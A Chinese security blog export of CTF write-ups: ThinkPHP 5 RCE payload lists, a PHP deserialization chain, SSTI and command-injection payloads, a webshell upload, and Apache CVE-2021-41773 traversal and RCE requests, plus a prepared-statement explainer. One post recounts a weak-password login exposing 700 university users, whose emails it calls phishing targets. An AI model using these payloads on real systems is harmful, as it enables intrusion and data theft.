data伪协议 接着查看源代码即可拿到flag 这里不在赘述剩余方法，感兴趣可以参考文章自行尝试 文章参考： 参考一 参考二","categories":["攻防世界"]},{"title":"攻防世界-php_rce","path":"/2023/08/14/php-rce/","content":"题目描述： 无 题目信息： 这里也是第一正式做有关框架的漏洞，那就顺手学习一波 0x01 ThinkPHP 5漏洞简介 ThinkPHP官方2018年12月9日发布重要的安全更新，修复了一个严重的远程代码执行漏洞。该更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。 看得出来程序没经过控制器进行过滤，所以可以用/来控制程序。 搞不懂这个漏洞是怎么搞出来的，借用一下大神的答案。 ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令 (如 dir whoami) ThinkPHP框架的主要特点包括： MVC架构：采用经典的MVC（Model-View-Controller）架构，将应用程序的业务逻辑、数据模型和用户界面分离，使得应用程序更易于维护和扩展。 ORM支持：提供了强大的ORM（Object-Relational Mapping）支持，可以将数据库表映射为对象，使得开发人员可以更方便地操作数据库。 缓存支持：提供了多种缓存支持，包括文件缓存、Memcached缓存、Redis缓存等，可以提高应用程序的性能和响应速度。 安全性：提供了多种安全机制，包括输入验证、输出过滤、SQL注入防护、XSS防护等，可以保障应用程序的安全性。 扩展性：提供了丰富的扩展机制，包括插件机制、行为机制、模板引擎扩展等，可以方便地扩展和定制应用程序。 0x02 PHP REC PHP RCE 指的是通过远程代码执行漏洞（Remote Code Execution）来攻击 PHP 程序的一种方式。简单来说，由于PHP应用程序没有正确处理外部输入数据（如用户提交的表单、请求参数等），攻击者通过某些手段向 PHP 应用程序中注入恶意代码，然后通过这些恶意代码实现对受攻击服务器的控制。 下面简单介绍一种常见的远程 RCE 漏洞利用方式，即利用 PHP 中的 eval 函数实现 RCE 的方式。在该示例中，攻击者可以通过 HTTP 请求向目标服务器传递 PHP 代码，并执行该代码： // 服务端代码 $user_input = $_GET['user_input']; // 没有对输入进行过滤 eval('$result = ' . $user_input . ';'); // 远程代码执行 // 攻击者构造恶意代码 http://example.com/index.php?user_input=system('ls%20-la'); //远程执行 \"ls -la\" 命令。 由于服务器代码没有对 user_input 的内容进行过滤和验证，攻击者可以通过 user_input 参数发送任意 PHP 代码，并将其作为一个字符串传递给 eval 函数进行执行，成功实现ls -la命令。 在 Unix/Linux 系统中，ls -la 命令可以列出当前目录下的所有文件和子目录，并显示它们的详细信息，包括权限、创建时间、大小等等。 0x03 ThinkPHP V5漏洞Payload 3.1 thinkphp 5.0.22 1、http://192.168.1.1/thinkphp/public/?s=.|think\\config/get&amp;name=database.username 2、http://192.168.1.1/thinkphp/public/?s=.|think\\config/get&amp;name=database.password 3、http://url/to/thinkphp_5.0.22/? s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 4、http://url/to/thinkphp_5.0.22/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 3.2 thinkphp 5 1、http://127.0.0.1/tp5/public/?s=index/\\think\\View/display&amp;content=%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data=1 3.3 thinkphp 5.0.21 1、http://localhost/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 2、http://localhost/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 3.4 thinkphp 5.1. 1、http://url/to/thinkphp5.1.29/?s=index/\\think\\Request/input&amp;filter=phpinfo&amp;data=1 2、http://url/to/thinkphp5.1.29/?s=index/\\think\\Request/input&amp;filter=system&amp;data=cmd 3、http://url/to/thinkphp5.1.29/?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E 4、http://url/to/thinkphp5.1.29/?s=index/\\think\\view\\driver\\Php/display&amp;content=%3C?php%20phpinfo();?%3E 5、http://url/to/thinkphp5.1.29/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 6、http://url/to/thinkphp5.1.29/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd 7、http://url/to/thinkphp5.1.29/?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 8、http://url/to/thinkphp5.1.29/?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd 3.5 thinkphp5.0.20 1、http://localhost/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 题目解题： 在这里呢，不先啰嗦漏洞的复现，复现就放在漏洞库吧，有时间先搞这个，我们回归题目 方法一：手工 使用thinkphp 5.1.payload，测试一手框架版本 URL + /?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls 回显如下： 真实原理目前没了解，不过能看出来，这里的poc思路是调用一个方法，传入call_user_func_array函数，接着传入system，则会成功执行system(‘ls’)；命令 发现报错，显示版本为5.0.20，那我们对应使用poc即可 ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 成功执行，更换命令 ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls 在查看一下根目录 ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls / ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag 拿到flag 方法二：工具检测 对于thinkphp框架Github上有一个专用的漏洞验证工具：https://github.com/zangcc/Aazhen-v3.1 下载项目中的jar包之后，在Aazhen_RexHa文件根目录下运行命令打开该工具 java -javaagent:rexha.jar -jar rexha.jar 打开工具后将靶场地址粘进去，全扫一遍后发现有两个漏洞，一个是远程代码执行，还有一个数据库信息泄露 远程代码任意执行一般能拿到不少东西，先使用这个，此工具已经给一个可用的url案例，我们只需要更改就可以了 http://61.147.171.105:49836/index.php?s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=system&amp;vars%5B1%5D%5B%5D=id //这个url已经过urlencode，为了方便理解，下面一行使用urldecode结果展示 http://61.147.171.105:49836/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 参数解析 这个URL参数是对目标web服务器进行的远程代码执行 ThinkPHP的请求处理器（think） 应用程序控制器（app） 函数调用器（invokefunction） 通过invokefunction指定了要调用的函数名为\"calluserfuncarray\"。该函数的作用是调用一个用户自定义的函数，并将一个数组作为参数传递给该函数。 在这个URL请求中，该函数的第一个参数是\"system\"，表示要执行的系统命令， 第二个参数是一个数组，其中包含要传递给该命令的参数。在这个例子中，该数组只包含一个参数\"id\" 下面我们把的第二个数组元素内容作为要执行的命令修改以下就ok了 这里参考方法一即可，不在赘述 参考文章： 方法一参考 方法二参考","categories":["攻防世界"]},{"title":"edu挖掘","path":"/2023/08/09/ji-yi-ci-edusrc-lou-dong-wa-jue/","content":"前言 这里也是花了将近一周的时间加上运气成分才找到的，怎么说呢，这次成功的挖掘让我对前期的信息搜集有了切身的体会，真的应了那就话：信息搜集搜的越多，挖出来的也越多。 在这段时间前期很忧愁，感觉自己真废，什么也搞不出来，但也确实体会到了实战的环境，同时庆幸自己坚持了下来，虽然漏洞不怎么高级，但也算是良好的开端。 总结一句话：挖漏洞一定注重前期的信息搜集（虽然我挖出来了，但我仍然知道我信息搜集做的有点烂，这次之后一定注重细节了），另外就是一定要坚持，一时半会儿挖不出来很正常，但一定要坚持，想想自己的流程还有什么遗漏以及可以改进的地方。挖漏洞一定要耐心，不可聒噪。 漏洞挖掘 这里首先随机挑选一名幸运儿，我这里是随后进他官网，确定主域名，随机用子域名挖掘机，爆破子域名及ip 随后在用fofa_viewer扫描子域名，这样大概就比较准确了，不过这里也是感觉layer有点鸡肋，虽然字典强大，但感觉不怎么高效，看日后的作用吧。。。 测试一番发现可疑点，访问9090端口发现进入一个后台登录页面，这里也是某微OA漏洞，虽然我这里只是一个弱口令，但我相信肯定还有其他的漏洞，这次之后在进行尝试。 这里成功弱口令登录，用户名和密码都是admin，成功进入 这里也是发现七百多个用户的信息 其中有电子邮箱可能适合钓鱼。。。 总结 感觉没咋用力，这个系统功能点也很单一，对我个人来说没有再能进一步利用的点了，但我觉得这种类似的系统应该可以通杀，这就留给日后的测试吧。这里也是第一次挖，提交之后成功得到edu账号，没想到这还能评上中危。。。。 继续坚持！！！","categories":["src漏洞挖掘"]},{"title":"攻防世界-Web_php_unserialize","path":"/2023/08/08/web-php-unserialize/","content":"题目描述： 无 题目解题： &lt;?php class Demo { private $file = 'index.php'; public function __construct($file) { $this-&gt;file = $file; } function __destruct() { echo @highlight_file($this-&gt;file, true); } function __wakeup() { if ($this-&gt;file != 'index.php') { //the secret is in the fl4g.php $this-&gt;file = 'index.php'; } } } if (isset($_GET['var'])) { $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\\d+:/i', $var)) { die('stop hacking!'); } else { @unserialize($var); } } else { highlight_file(\"index.php\"); } ?&gt; 很尴尬，这题已经做过了，感兴趣可以翻翻我以前的文章，这里就直接上pop了，也很简单 &lt;?php class Demo { private $file = 'index.php'; public function __construct($file) { $this-&gt;file = $file; } function __destruct() { echo @highlight_file($this-&gt;file, true); } function __wakeup() { if ($this-&gt;file != 'index.php') { //the secret is in the fl4g.php $this-&gt;file = 'index.php'; } } } $a= new Demo('fl4g.php'); $poc=serialize($a); $poc=str_replace('O:4', 'O:+4',$poc); $poc=str_replace(':1:', ':2:',$poc); echo $poc; $poc = (base64_encode($poc)); echo $poc; ?&gt; 输出如下： O:+4:\"Demo\":2:{s:10:\"Demofile\";s:8:\"fl4g.php\";} TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 拿到flag","categories":["攻防世界"]},{"title":"攻防世界-Web_python_template_injection","path":"/2023/08/08/web-python-template-injection/","content":"题目描述： 无 题目解题： 看到该页面，毫无疑问就是python的ssti注入了，那我们抓包看一下 在这里看到页面也没有注入的地方，就想着现在url后面直接加上模板看看 如上图，成功证明存在ssti漏洞 那我们先取object这个类，随后在列举出其所有子类（这里我是先看了看第400个以后的元素） 这里又找到一个popen命令函数，那我们在定位一下，这里采用如下payload {{().__class__.__bases__[0].__subclasses__()}} 直接上脚本找 import requests headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0' } for i in range(500): url = \"http://61.147.171.105:62011/={{().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"].__init__.__globals__}}\" res = requests.get(url=url, headers=headers) if 'popen' in res.text: print(i) 找到237，定位一下看看 成功定位，那直接传参数ls，payload如下 {{().__class__.__bases__[0].__subclasses__()[237](\"ls\",shell=True,stdout=-1).communicate()}} 详细使用方法可以参考Python手册，这里communicate函数作用是将命令执行后的内容输出出来 找到flag，cat读一下看看 {{().__class__.__bases__[0].__subclasses__()[237](\"cat fl4g\",shell=True,stdout=-1).communicate()}} 成功","categories":["攻防世界"]},{"title":"攻防世界-web2","path":"/2023/08/08/web2/","content":"题目描述： 解密 题目解题： 打开题目开始审计代码 &lt;?php $miwen=\"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\"; function encode($str){ $_o=strrev($str); // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++){ $_c=substr($_o,$_0,1); $__=ord($_c)+1; $_c=chr($__); $_=$_.$_c; } return str_rot13(strrev(base64_encode($_))); } highlight_file(__FILE__); /* 逆向加密算法，解密$miwen就是flag */ ?&gt; 先解释一下各个函数用法 strrev— 反转字符串 说明 string strrev (string $string) 返回 `string` 反转后的字符串。 参数 string 待反转的原始字符串。 返回值 返回反转后的字符串。 Example #1 使用 strrev() 反转字符串 &lt;?php echo strrev(\"Hello world!\"); // 输出 \"!dlrow olleH\" ?&gt; substr — 返回字符串的子串 说明 string substr( string $string, int $start[, int $length] ) 返回字符串 string 由 start 和 length 参数指定的子字符串。 参数 string 输入字符串。必须至少有一个字符。 start 如果 start 是非负数，返回的字符串将从 string 的 start 位置开始，从 0 开始计算。例如，在字符串 \"abcdef\" 中，在位置 0 的字符是 \"a\"，位置 2 的字符串是 \"c\" 等等。 如果 start 是负数，返回的字符串将从 string 结尾处向前数第 start 个字符开始。 如果 string 的长度小于 start，将返回 FALSE。 Example #1 使用负数 start &lt;?php $rest = substr(\"abcdef\", -1); // 返回 \"f\" $rest = substr(\"abcdef\", -2); // 返回 \"ef\" $rest = substr(\"abcdef\", -3, 1); // 返回 \"d\" ?&gt; ord — 返回指定字符的ASCII码 chr — 返回指定的字符 由此我们理一下思路，这里他的函数是将传入的字符，先进行逆转，随后将每个字符的ascii值增了1，接着先base64编码，在逆转，在rot13加密，那我们逆着将题目做一遍即可得到flag 也就是，先将待解密的密文rot13解密 接着将得到的字符逆转一下，在base64解密 可见flag已经初具雏形，接着在逆转字符，然后令每个字符的ascii值减1，这里减1与逆转的步骤可以翻一下，不影响，最终得到flag","categories":["攻防世界"]},{"title":"攻防世界-command_execution","path":"/2023/08/07/command-execution/","content":"题目描述： 小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。 题目解题： 进入页面如图所示，题目告诉我们这关没写waf，所以随便输入命令即可进行命令执行 命令执行漏洞即使用者可以直接在Web应用中执行系统命令，从而获取敏感信息或者拿下shell权限。其造成的原因是Web服务器对用户输入命令安全检测不足（比如没加waf），导致恶意代码被执行。 ping用于确定本地主机是否能与另一台主机成功交换(发送与接收)数据包，再根据返回的信息，就可以推断TCP/IP参数是否设置正确，以及运行是否正常、网络是否通畅等 先用本机127.0.0.1去ping一下看 发现有回显，说明ping成功了。然后我们可以将输入参数截断从而让其运行危险的参数。 常见管道连接符如下： ; A;B 先执行A，再执行B &amp; A&amp;B 简单拼接，A B之间无制约关系 | A|B 显示B的执行结果 &amp;&amp; A&amp;&amp;B A执行成功，然后才会执行B || A||B A执行失败，然后才会执行B 那我们输入：127.0.0.1|ls看看 成功执行，那么找一下flag，find / name \"flag*\" 查看flag.txt即可 ICMP是Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。 而ICMP协议主要是靠ping工具来实现的。使用ping了之后会收到来自ip地址（也有可能是通过DNS把url给解析为ip地址）的回复。而ping本地的回环地址（127.0.0.1）的操作是检查本机的网卡，TCP/IP配置是否正确，也是使用ping工具的首要步骤。 参考文章： wp参考","categories":["攻防世界"]},{"title":"攻防世界-xff_referer","path":"/2023/08/07/xff-referer/","content":"题目描述： X老师告诉小宁其实xff和referer是可以伪造的。 题目解题： 很明显，我们直接bp修改xff头 如图所示，修改后提示信息如图，那我们修改referer头 成功得到flag","categories":["攻防世界"]},{"title":"攻防世界-upload1","path":"/2023/08/07/upload1/","content":"题目描述： 无 题目解题： 来到页面，以为这道题很难呢，结果。。。 这与难度也不匹配啊，不说了，开始解题 首先随便上传一个文件夹试试水 发现我再上传了一个普通的1.txt之后，弹出了一个验证框，那估计就是前端验证了，这里F12禁用js即可，接着抓包修改试试 修改为php后，发现成功上传。。。。。，那我们访问一下 发现成功种马，那直接蚁剑连接 找到flag。。。。。。。","categories":["攻防世界"]},{"title":"浅析目录穿越","path":"/2023/08/07/qian-xi-mu-lu-chuan-yue/","content":"0x01 简介 目录穿越（也被称为目录遍历）是通过使用../等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等。 路径穿越是网站被恶意人员利用，来得到其无权限访问的内容。 通常是由于代码没有判断拼接路径的真实路径是否合法，最终导致文件读取。 一般来讲用户在网站进行浏览，所能见到的网页都是位于网站根目录下的文件，根目录以外的文件是不允许被未授权访问的。但是安全方面做得不严谨的web程序可能会出现目录穿越漏洞，恶意人员可以利用这个漏洞来读取根目录以外的文件夹。一旦成功，本不应该暴露的敏感信息就可能被泄漏给恶意人员。 0x02 攻击payload 1.URL参数 ··/ ..\\ ..;/ 2.Nginx off by slash https://vuln.site.com/files../ 3. UNC Bypass https://localhost/c$/windows/win.ini 4.过滤绕过 单次替换，如..// URL编码 16位Unicode编码 超长UTF-8编码 5.加密参数传递的数据 有的网站程序传递参数后会进行base64加密（当然也会有其他加密），导致我们传递的参数无法解析，所以就无法利用目录遍历，而绕过方式也很简单，就是先对参数进行base64加密后再进行传参。如： ?page=bTByZS50eHQ= 6.目录限定绕过 有些Web应用程序是通过限定目录权限来分离的。可以使用一些特殊的符号~来绕过。比如提交这样的xxx.php?page=~/../boot。就可以直接跳转到硬盘目录下。 7.绕过文件后缀过滤 一些Web应用程序在读取文件前，会对提交的文件后缀进行检测，攻击者可以在文件名后放一个空字节的编码，来绕过这样的文件类型的检查。 比如：../../../../boot.ini%00.jpg，Web应用程序使用的Api会允许字符串中包含空字符，当实际获取文件名时，则由系统的Api会直接截短，而解析为../../../../boot.ini。 在类Unix的系统中也可以使用Url编码的换行符，例如：../../../etc/passwd%0a.jpg如果文件系统在获取含有换行符的文件名，会截短为文件名。也可以尝试%20，例如: ../../../index.php%20 8.绕过来路验证 Http Referer : HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的 在一些Web应用程序中，会有对提交参数的来路进行判断的方法，而绕过的方法可以尝试通过在网站留言或者交互的地方提交Url再点击或者直接修改Http Referer即可，这主要是原因Http Referer是由客户端浏览器发送的，服务器是无法控制的，而将此变量当作一个值得信任源是错误的。 0x03 防御 方案一：过滤恶意字符，如..、./、.\\等 缺点：黑名单过滤不全的话，很容易被绕过。 方案二：采用白名单方式，只允许读取特定文件，若不是特定文件直接拦截。也可以仅允许纯字母或数字字符等。 方案三：按照.分割，读文件名参数和文件格式参数，如果文件名参数中有..，则拦截 0x04 附录：UNC路径 UNC（Universal Naming Convention） 为了迎合网络化的趋势，windows的地址风格（C:\\ABC\\def\\文件、\\\\计算机名\\dir\\file）向网络地址风格做了一次兼容变换。 整体形式如： file://机器的IP地址/目录/文件 file表示协议类型 :// 后面是机器的网络地址 /后面是目录和文件名 我们访问网上邻居所采用的命令行访问法，实际上应该称作UNC路径访问法。 0x05 漏洞实战 CVE-2021-41773 漏洞概述 Apache HTTP Server（简称 Apache）是开源的 Web 服务器，可以在大多数计算机操作系统中运行，由于其多平台和安全性被广泛使用，是最流行的 Web 服务器端软件之一。它快速、可靠并且可通过简单的 API 扩展，将 Perl/Python 等解释器编译到服务器中。 Apache 披露了一个在 Apache HTTP Server 2.4.49 上引入的漏洞，称为 CVE-2021-41773。同时发布了2.4.50更新，修复了这个漏洞。该漏洞允许攻击者绕过路径遍历保护，使用编码并读取网络服务器文件系统上的任意文件。运行此版本 Apache 的 Linux 和 Windows 服务器都受到影响。此漏洞是在 2.4.49 中引入的，该补丁旨在提高 URL 验证的性能。可以通过对“.”进行编码来绕过新的验证方法。如果 Apache 网络服务器配置未设置为“要求全部拒绝”，则漏洞利用相对简单。通过对这些字符进行编码并使用有效负载修改 URL，可以实现经典的路径遍历。 影响版本 41773——版本等于2.4.49 42013——版本等于2.4.49/50 在服务器开启cgi或cgid模块的情况下，该漏洞可执行任意命令。 复现过程 浏览器访问ip:8080。页面出现it works! 证明开启成功。 开启代理，上神器burpsuite就可以开搞了。 路径穿越 GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1 /icons/目录是一个存在且可访问的目录，测试时也可改为其他目录如/cgi-bin/，但在本环境中/cgi-bin/目录访问状态码为403，因此使用了/icons/目录 RCE POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1 echo; ls（要执行的命令） 修复方案 升级到最新版的Apache HTTP Server 安全版本。 利用工具 多翻了一下相关文章，找到了一个漏洞利用工具。 https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013 思考 关于上述/bin/sh如何可以执行命令的思考总结 首先他说：在服务器开启cgi或cgid模块的情况下，该漏洞可执行任意命令。 那了解一下CGI程序的含义：GPT回答 Apache 中间件中，CGI 是 Common Gateway Interface（通用网关接口）的缩写。CGI 是一种标准的协议，它定义了 Web 服务器如何与外部程序（通常是脚本或可执行文件）进行通信，从而处理动态内容并将其呈现给客户端的浏览器。 当客户端请求一个需要服务器动态生成内容的网页时，Web 服务器会将请求传递给 CGI 程序。这个 CGI 程序可以是任何可执行的脚本（如Perl、Python、Bash脚本等）或编译的可执行文件。CGI 程序会处理请求并生成相应的动态内容，然后将结果返回给服务器，最终由服务器传递给客户端浏览器。 Apache 中的 CGI 模块允许服务器与 CGI 程序进行交互。当 Apache 接收到一个包含 CGI 路径的请求时，它会启动相应的 CGI 程序，并将请求的信息传递给它（例如：请求方法、头部、查询参数等）。CGI 程序可以读取这些信息并根据需要生成响应内容。 也就是说该程序可以执行脚本，并且也支持bash脚本 查看 apache 关于 cgi 的文档： STDIN and STDOUT Other communication between the server and the client happens over standard input (STDIN) and standard output (STDOUT). In normal everyday context, STDIN means the keyboard, or a file that a program is given to act on, and STDOUT usually means the console or screen. When you POST a web form to a CGI program, the data in that form is bundled up into a special format and gets delivered to your CGI program over STDIN. The program then can process that data as though it was coming in from the keyboard, or from a file The \"special format\" is very simple. A field name and its value are joined together with an equals (=) sign, and pairs of values are joined together with an ampersand (&amp;). Inconvenient characters like spaces, ampersands, and equals signs, are converted into their hex equivalent so that they don't gum up the works. The whole data string might look something like: name=Rich%20Bowen&amp;city=Lexington&amp;state=KY&amp;sidekick=Squirrel%20Monkey 有道翻译： 标准输入和标准输出 服务器和客户机之间的其他通信通过标准输入(STDIN)和标准输出(STDOUT)进行。在正常的日常上下文中，STDIN指的是键盘，或者是程序要执行的文件，而STDOUT通常指的是控制台或屏幕。 当您向CGI程序发布web表单时，该表单中的数据被捆绑成一种特殊格式，并通过STDIN传递给您的CGI程序。然后，程序就可以处理这些数据，就好像它是从键盘或文件中输入的一样 “特殊格式”非常简单。字段名及其值用等号(=)连接在一起，值对用&amp;号(&amp;)连接在一起。不方便的字符，如空格、&amp;号和等号，被转换成它们的十六进制等号，这样它们就不会把工作搞得一团糟。整个数据字符串可能看起来像这样: name=Rich%20Bowen&amp;city=Lexington&amp;state=KY&amp;sidekick=Squirrel%20Monkey 也就是说，通过 POST 传入的 参数，会作为 stdin 的内容，交给 所访问的 cgi 程序处理 如果访问的是 /bin/sh ，那么就能直接 getshell 了 也就是你post传入的参数内容被当做bash脚本执行了（这里恰好该服务器对url路径启用了CGI脚本，因此可以执行代码）","categories":["常见top漏洞"]},{"title":"预编译sql防御","path":"/2023/08/07/yu-bian-yi-sql-fang-zhi-sql-zhu-ru/","content":"前言 为啥用 PreparedStatement 预编译的 SQL 就不会有被 SQL 注入的风险？ 第一时间我联想到的是八股文中关于 Mybatis 的脚本 ${} 和 #{} 的问题，不过再想想，为啥 ${} 会有 SQL 注入的风险，而 #{} 就没有？是因为到 PreparedStatement 做了什么处理吗？不知道。 然后我又想了想，预编译到底是个什么概念？预编译或者不预编译的 SQL 对数据库来说有什么区别吗？PreparedStatement 又在这个过程中扮演了怎样的角色？不知道。 好吧，我发现我确实对这个问题一无所知，看来需要亲自研究一下了。(这是真的) 一、数据库预编译 当我们说到关于持久层框架的功能，必然需要先想想这个功能的源头到底是不是直接通过数据库提供的。实际上和事务一样，SQL 预编译的功能也是需要数据库提供底层支持的。 1、预编译SQL的用法 以 MySQL 为例，在 MySQL 中，所谓预编译其实是指先提交带占位符的 SQL 模板，然后为其指定一个 key，MySQL 先将其编译好，然后用户再拿着 key 和占位符对应的参数让 MySQL 去执行，用法有点像 python 中的 format 函数。 一个标准的预编译 SQL 的用法如下： prepare prepare_query from 'select * from s_user where username = ?' # 提交带有占位符的参数化 SQL，也可以理解为 SQL 模板 set @name = '%王五'; # 指定一个参数 execute prepare_query using @name; # 指定参数化 SQL 的 key 和参数，让 MySQL 自己去拼接执行 先通过 prepare 设置一个 SQL 模板，然后通过 execute 提交参数，MySQL 会自行根据参数替换占位符，到最后执行的 SQL 就是： select * from s_user where username = '%王五' 2、预编译的原理 这里有个有意思问题，按网上的说法，prepare 执行的时候实际上 SQL 已经编译完了，所以可以防止注入，因为后续不管塞什么参数都不可能在调整语法树了，换个角度想，这是不是说明，如果我们一开始就让 prepare 执行的 SQL 模板的关键字变成占位符，是不是应该在这个时候就编译不通过？ 比如，可以把查询的表名改成占位符： prepare prepare_query from 'select * from ? where username = ?' # &gt; 1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to # use near '? where username = ?' at line 1 实际上也确实不行，因为编译时必须确定主表，因此在 from 后面加占位符会导致预编译不通过。 那么只在查询字段里面套一个嵌套查询呢？ prepare prepare_query from 'select ? from s_user'; SET @c = '(select * from s_user) as q'; EXECUTE prepare_query using @c; # 查询结果 # (select * from s_user) as q # (select * from s_user) as q # (select * from s_user) as q # ...... 查询成功了，不过得到的结果的固定的 (select * from s_user) 这个字符串，我们检查一下 MySQL 的执行日志，看看最终执行的 SQL 变成什么样了： Prepare\tselect ? from s_user Query\tSET @c = '(select * from s_user) as q' Query\tEXECUTE prepare_query using @c Execute\tselect '(select * from s_user) as q' from s_user # 最终执行的SQL 显然，(select * from s_user) 参数本身被直接转义为了一串普通的字符串，我们试图“注入”的 SQL 片段完全不会生效。 换而言之，对于预编译 SQL 来说，我们作为模板的参数化 SQL 已经完成的编译过程，这段 SQL 包含几条有效语句？查哪张表？查哪些字段？作为条件的字段有哪些？…这些在 prepare 语句执行完后都是固定的，此后我们再通过 execute 语句塞进去的任何参数，都会进行转义，不会再作为 SQL 的一部分。这就是为什么说预编译 SQL 可以防止注入的原因。 二、JDBC的预编译 现在我们知道了预编译在数据库中是个怎样的功能，那么 JDBC 又是如何把这个功能提供给开发者使用的呢？ 1、PreparedStatement 从最开始学 JDBC 时，我们就知道通过 JDBC 连接数据库一般是这样写的： Class.forName(JDBC_DRIVER); // 加载驱动 Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD); // 获取连接 PreparedStatement preparedStatement = connection.prepareStatement(sql); // 获取sqlStatement preparedStatement.setString(1, foo); // 设置参数 ResultSet resultSet = preparedStatement.executeQuery(); // 执行SQL 这里有一个关键角色 PreparedStatement，相比起它的父接口 Statement，它最大的变化是多了各种格式为 setXXX 的、用于设置与占位符对应的参数的方法，显然它正对应着上文我们提到的预编译 SQL。 2、虚假的“预编译” 不过事情显然没有这么简单，我们依然以 MySQL 为例，默认情况下 MySQL 驱动包提供的 PreparedStatement 实现类 ClientPreparedStatement 也能起到防止 SQL 注入的功能，但是方式跟我们想的不太一样。 假设现有如下代码，我们尝试模拟进行一次 SQL 注入： String sql = \"select * from s_user where username = ?\"; PreparedStatement preparedStatement = connection.prepareStatement(sql); preparedStatement.setString(1, \"王五' union select * from s_user\"); ResultSet resultSet = preparedStatement.executeQuery(); 运行上述代码并正常的请求数据库，然后我们去数据库执行日志中查看对应的执行的 SQL 如下，会发现只有这么一行： Query select * from s_user where username = '王五'' union select * from s_user' 显然跟我们上文说到的先 prepare 再 execute 流程不同，带有占位符的原始 SQL 模板并没有在日志中出现，但是代码中的 王五' 确实也被转义为了 '王五''。 数据库到底收到了哪些数据？ 那么数据库到底拿到的就是这条 SQL，还是原始的 SQL 模板 + 参数呢？ 为了了解这一点，我们打断点跟踪 ClientPreparedStatement.executeQuery 方法，一路找到它组装请求数据库的参数的那一行代码： Message sendPacket = ((PreparedQuery&lt;?&gt;) this.query).fillSendPacket(); 最后我们会进入 AbstractPreparedQuery.fillSendPacket 这个方法，这里主要干的事是把我们带占位符的原始 SQL 模板和参数合并为最终要执行的 SQL ，并封装到 NativePacketPayload 对象，用于在后续发起 TCP 请求时把 SQL 参数转为二进制数据包。 为了验证这一点，我们先拿到 sendPacket 对象，再获取里面的字节数组，最后转为字符串： 可以看到内容就是已经格式化完的 SQL： select * from s_user where username = '王五'' union select * from s_user' 现在答案就很明显了，转义在 preparedStatement.setString 方法调用的时候完成，而 PreparedStatement 在发起请求前就把转义后的参数和 SQL 模板进行了格式化，最后发送到 MySQL 的时候就是一条普通的 SQL。 鉴于此，我们可以说 MySQL 提供的 PreparedStatement 在默认情况下是假的“预编译”，它只不过在设置参数的时候帮我们对参数做了一下转义，但是最后发送到数据库的依然是普通的 SQL，而不是按预编译 SQL 的方式去执行。 3、真正的预编译 好吧，那既然 MySQL 提供了这个预编译的功能，那通过 JDBC 肯定也还是有办法用上真正的预编译功能的，实际上要做到这点也很简单，就是直接在驱动的 url 上配上 useServerPrepStmts=true ，这样就会真正的启用 MySQL 的预编译功能。 依然以上文的代码为例： String sql = \"select * from s_user where username = ?\"; PreparedStatement preparedStatement = connection.prepareStatement(sql); preparedStatement.setString(1, \"王五' union select * from s_user\"); ResultSet resultSet = preparedStatement.executeQuery(); 设置了 useServerPrepStmts=true 后再执行代码，去数据库查看执行日志有： Execute select * from s_user where username = '王五\\' union select * from s_user' Prepare select * from s_user where username = ? 此时 MySQL 的预编译功能就真正的生效了。 我们回到 ClientPreparedStatement.executeQuery 创建 sendPacket 地方看，此时通过 